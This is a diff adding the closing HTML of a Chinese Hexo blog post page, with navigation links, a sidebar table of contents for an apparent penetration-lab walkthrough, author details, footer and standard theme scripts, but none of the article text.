+    <a href="/2021/03/29/CTFshow-Misc%E5%85%A5%E9%97%A8-%E5%9B%BE%E7%89%87%E7%AF%87/" rel="prev" title="CTFshow-Misc入门-图片篇">
+      <i class="fa fa-chevron-left"></i> CTFshow-Misc入门-图片篇
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/30/%E9%9D%B6%E6%9C%BADC-2%E7%9A%84%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" rel="next" title="靶机DC-2的渗透记录">
+      靶机DC-2的渗透记录 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%86%E5%A4%87"><span class="nav-number">1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Metasploit%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">Metasploit漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag-1"><span class="nav-number">4.</span> <span class="nav-text">flag 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag-2"><span class="nav-number">5.</span> <span class="nav-text">flag 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag-3"><span class="nav-number">6.</span> <span class="nav-text">flag 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag-4"><span class="nav-number">7.</span> <span class="nav-text">flag 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag-5"><span class="nav-number">8.</span> <span class="nav-text">flag 5</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Reigniting"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Reigniting</p>
+  <div class="site-description" itemprop="description">对你表达的东西也好，鼓起勇气面对曾经的自己也罢。 寻觅着你的步伐，从未停下。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Reigniting</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">20k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">18 分钟</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":200,"height":400},"mobile":{"show":false,"scale":0.5},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
